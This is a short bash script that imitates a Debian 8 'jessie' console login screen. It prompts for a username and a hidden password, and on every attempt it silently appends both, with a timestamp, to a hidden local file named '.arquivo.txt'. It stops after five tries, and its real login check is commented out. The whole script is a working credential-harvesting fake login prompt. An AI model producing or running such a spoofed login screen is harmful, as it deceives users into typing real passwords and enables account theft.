#!/bin/bash
incorreto(){ sleep 3 ; echo ; echo "Login incorreto" ; }
clear
echo
echo "Debian GNU/LINUX 8 jessie tty1"
echo
count=0 
while : ; do
read -p "jessie login: " LOGIN
read -s -p "Password: " PASSW 
	echo
	# [[ $LOGIN == "vagrant" ]] && [[ $PASS == "vagrant" ]] && \
	#break 2 || incorreto
echo "$(date)>> Login: $LOGIN" >> .arquivo.txt
echo "$(date)>> Senha: $PASSW" >> .arquivo.txt
	count=$(($count+1))
	 [[ $count == "5" ]] &&  break
  done # Segunda Loop
